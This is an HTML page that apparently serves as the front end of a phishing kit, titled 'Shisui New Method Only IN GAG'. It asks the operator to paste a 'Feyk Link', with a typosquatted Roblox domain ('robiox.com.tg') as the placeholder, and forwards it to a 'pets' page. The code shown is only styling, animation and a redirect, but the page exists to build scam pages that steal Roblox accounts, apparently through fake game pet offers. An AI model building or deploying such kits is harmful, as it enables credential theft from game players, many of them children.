<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Shisui New Method Only IN GAG</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #000;
      overflow: hidden;
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    h1 {
      font-size: 2.5rem;
      margin-bottom: 30px;
      text-shadow: 0 0 5px red;
      z-index: 1;
    }

    form {
      background: rgba(255, 0, 0, 0.1);
      padding: 20px 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px red;
      z-index: 1;
    }

    label {
      display: block;
      margin-bottom: 10px;
      font-size: 1rem;
    }

    input[type="text"] {
      width: 300px;
      padding: 10px;
      font-size: 1rem;
      border-radius: 5px;
      border: none;
      margin-bottom: 20px;
    }

    button {
      padding: 10px 25px;
      font-size: 1rem;
      background: red;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background: darkred;
    }

    .dot {
      position: absolute;
      background-color: red;
      border-radius: 50%;
      opacity: 0.6;
      animation: floatMove linear infinite;
    }

    @keyframes floatMove {
      0% {
        transform: translate(0, 0);
      }
      50% {
        transform: translate(50px, -60px);
      }
      100% {
        transform: translate(0, 0);
      }
    }
  </style>
</head>
<body>

  <h1>Shisui Created New Method</h1>

  <form id="feykForm">
    <label for="feykLink">Your Feyk Link Put here:</label>
    <input type="text" id="feykLink" name="feykLink" placeholder="https://www.robiox.com.tg/" required />
    <button type="submit">Submit</button>
  </form>

  <script>
    // Create animated moving red dots
    for (let i = 0; i < 30; i++) {
      const dot = document.createElement('div');
      dot.classList.add('dot');
      const size = Math.random() * 10 + 5;
      const duration = 5 + Math.random() * 10;

      dot.style.width = `${size}px`;
      dot.style.height = `${size}px`;
      dot.style.left = `${Math.random() * 100}vw`;
      dot.style.top = `${Math.random() * 100}vh`;
      dot.style.animationDuration = `${duration}s`;
      dot.style.animationDelay = `${Math.random() * 5}s`;

      document.body.appendChild(dot);
    }

    // Handle form submit
    document.getElementById('feykForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const feykLink = document.getElementById('feykLink').value.trim();
      if (feykLink) {
        const encodedLink = encodeURIComponent(feykLink);
        window.location.href = `pets/index.html?${encodedLink}`;
      }
    });
  </script>

</body>
</html>
